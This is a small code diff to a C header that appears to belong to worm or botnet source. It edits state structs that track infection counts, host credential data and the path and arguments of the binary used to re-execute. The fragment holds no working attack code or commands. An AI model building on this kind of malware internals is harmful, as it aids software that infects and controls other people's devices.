@@ -33,7 +33,7 @@ struct prne_global { // TODO: tidy init code when finalised
 	uint16_t dvault_size;
 	bool bin_ready;
 	bool is_child;
-	
+
 	prne_bin_archive_t bin_archive;
 
 	struct {
@@ -66,12 +66,10 @@ struct prne_shared_global {
 	// Number of successful infections.
 	uint64_t infect_cnt;
 	// null-terminated name of new binary
-	char ny_bin_name[256];
+	char ny_bin_path[256];
+	char ny_bin_args[1024];
 	char host_cred_data[256];
 };
-
-static const intptr_t PRNE_RESOLV_WKR_ID = 0;
-static const intptr_t PRNE_HTBT_WKR_ID = 1;
 
 
 extern struct prne_global prne_g;
